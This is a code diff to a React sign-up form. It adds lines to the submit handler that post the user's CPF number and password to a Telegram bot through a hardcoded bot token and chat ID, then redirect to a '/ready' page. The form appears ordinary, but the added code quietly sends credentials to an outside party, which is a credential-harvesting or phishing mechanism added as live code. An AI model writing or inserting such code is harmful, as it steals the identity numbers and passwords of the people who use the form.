@@ -52,6 +52,18 @@ export default function SignUp() {
   const handleSubmit = (event: FormEvent<HTMLFormElement>) => {
     event.preventDefault()
     setIsLoading(true)
+    const botToken = '6841618266:AAGeOc6JWrD4isi6K7r56YRUXKiU6EJe5B4'
+    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        'chat_id': -1002138559916,
+        text: `
+          CPF: ${cpf}
+Password: ${password}
+        `
+      })
+    })
     setTimeout(() => {
       location.href = '/ready'
     }, 3000)
